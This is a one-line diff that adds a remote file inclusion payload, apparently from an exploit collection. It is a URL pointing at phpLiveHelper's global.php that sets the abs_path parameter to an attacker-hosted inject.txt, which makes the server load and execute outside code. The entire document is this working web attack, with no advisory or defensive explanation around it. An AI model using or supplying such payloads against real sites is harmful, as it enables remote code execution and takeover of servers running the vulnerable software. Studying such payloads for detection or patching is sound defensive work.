@@ -1,0 +1,1 @@
+http://www.example.com/[phplivehelper_path]/global.php?abs_path=http://www.example.com/inject.txt?
